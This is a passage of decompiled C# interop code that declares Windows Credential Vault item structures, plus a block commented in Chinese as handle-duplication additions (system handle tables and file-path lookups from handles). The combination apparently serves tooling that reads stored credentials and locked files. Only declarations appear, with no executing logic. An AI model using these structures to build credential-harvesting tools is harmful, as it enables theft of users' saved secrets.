			// Token: 0x04000172 RID: 370
			UnsignedInt,
			// Token: 0x04000173 RID: 371
			Double,
			// Token: 0x04000174 RID: 372
			Guid,
			// Token: 0x04000175 RID: 373
			String,
			// Token: 0x04000176 RID: 374
			ByteArray,
			// Token: 0x04000177 RID: 375
			TimeStamp,
			// Token: 0x04000178 RID: 376
			ProtectedArray,
			// Token: 0x04000179 RID: 377
			Attribute,
			// Token: 0x0400017A RID: 378
			Sid,
			// Token: 0x0400017B RID: 379
			Last
		}

		// Token: 0x02000056 RID: 86
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x0400017C RID: 380
			public Guid SchemaId;

			// Token: 0x0400017D RID: 381
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x0400017E RID: 382
			public IntPtr pResourceElement;

			// Token: 0x0400017F RID: 383
			public IntPtr pIdentityElement;

			// Token: 0x04000180 RID: 384
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000181 RID: 385
			public IntPtr pPackageSid;

			// Token: 0x04000182 RID: 386
			public ulong LastModified;

			// Token: 0x04000183 RID: 387
			public uint dwFlags;

			// Token: 0x04000184 RID: 388
			public uint dwPropertiesCount;

			// Token: 0x04000185 RID: 389
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000057 RID: 87
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x04000186 RID: 390
			public Guid SchemaId;

			// Token: 0x04000187 RID: 391
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000188 RID: 392
			public IntPtr pResourceElement;

			// Token: 0x04000189 RID: 393
			public IntPtr pIdentityElement;

			// Token: 0x0400018A RID: 394
			public IntPtr pAuthenticatorElement;

			// Token: 0x0400018B RID: 395
			public ulong LastModified;

			// Token: 0x0400018C RID: 396
			public uint dwFlags;

			// Token: 0x0400018D RID: 397
			public uint dwPropertiesCount;

			// Token: 0x0400018E RID: 398
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000058 RID: 88
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x0400018F RID: 399
			[FieldOffset(0)]
			public Win32Api.VAULT_ELEMENT_TYPE Type;

			// Token: 0x04000190 RID: 400
			[FieldOffset(16)]
			public IntPtr pszValue;
		}

		// 句柄复制（Handle Duplication）的新增内容
		public const int SystemHandleInformation = 16;
		public const int ObjectNameInformation = 1;

		[StructLayout(LayoutKind.Sequential)]
		public struct SYSTEM_HANDLE_INFORMATION_EX
		{
			public IntPtr NumberOfHandles;
			public IntPtr Reserved;
			public IntPtr Handles;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
		{
			public ushort UniqueProcessId;
			public ushort CreatorBackTraceIndex;
			public byte ObjectTypeIndex;
			public byte HandleAttributes;
			public ushort HandleValue;
			public IntPtr Object;
			public IntPtr GrantedAccess;
		}

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetFileSize(IntPtr hFile, out int lpFileSizeHigh);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern int GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, int cchFilePath, int dwFlags);

		public const int FILE_NAME_NORMALIZED = 0x0;



	}
}
